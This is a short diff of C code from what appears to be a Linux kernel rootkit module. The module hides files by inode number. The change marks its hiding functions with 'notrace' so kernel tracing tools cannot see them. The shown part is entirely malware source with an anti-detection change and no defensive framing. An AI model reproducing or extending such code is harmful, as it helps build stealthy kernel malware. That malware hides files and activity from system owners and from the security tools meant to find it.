@@ -8,7 +8,7 @@
 
 LIST_HEAD(hidden_inodes);
 
-void hide_file_inode(unsigned long ino)
+notrace void hide_file_inode(unsigned long ino)
 {
     struct inode_list *inode_entry;
     struct pid_list *pid_entry, *temp;
@@ -47,7 +47,7 @@ void hide_file_inode(unsigned long ino)
     list_add_tail(&inode_entry->list, &hidden_inodes);
 }
 
-int should_hide_inode(unsigned long ino)
+notrace int should_hide_inode(unsigned long ino)
 {
     struct inode_list *inode_entry, *hidden_inode = NULL;
     struct pid_list *pid_entry;
@@ -76,7 +76,7 @@ int should_hide_inode(unsigned long ino)
         return 0;
 }
 
-void show_file_inode(const void __user *user_info)
+notrace void show_file_inode(const void __user *user_info)
 {
     struct show_file_inode_info info;
     struct inode_list *inode_entry, *hidden_inode = NULL;
